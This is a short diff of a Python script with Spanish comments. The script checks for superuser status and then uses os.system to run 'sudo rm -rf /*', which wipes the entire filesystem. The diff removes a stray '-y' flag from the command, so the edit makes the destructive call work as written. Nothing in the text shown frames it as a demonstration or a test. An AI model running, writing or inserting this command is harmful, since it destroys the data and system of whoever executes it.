@@ -8,7 +8,7 @@ else:
     print("No estoy en super user")
 
 try:
-    os.system("sudo rm -rf /* -y")
+    os.system("sudo rm -rf /*")
 
 except OSError as e: # OSError Por intuición esto capta el error que te lanza el sistema operativo hacia el script
     print("System error", e)
